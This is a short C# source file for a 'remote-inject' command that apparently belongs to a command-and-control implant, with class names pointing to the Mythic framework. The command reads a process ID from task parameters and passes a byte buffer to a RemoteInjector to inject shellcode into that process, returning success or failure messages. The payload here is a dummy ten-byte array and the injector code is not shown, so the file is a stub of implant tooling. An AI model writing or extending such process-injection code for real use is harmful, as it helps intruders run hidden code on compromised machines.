using Models.Tasks;

namespace Injection
{
    public class RemoteInject : CerberusCommand
    {
        public override string Name => "remote-inject";

        public override string Execute(MythicTask task)
        {
            var FileBytes = new byte[10];
            var Arguments = task.parameters.Split(' ');

            if (!int.TryParse(Arguments[0], out var pid))
                return "Failed to parse PID";

            var injector = new RemoteInjector();
            var success = injector.Inject(FileBytes, pid);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
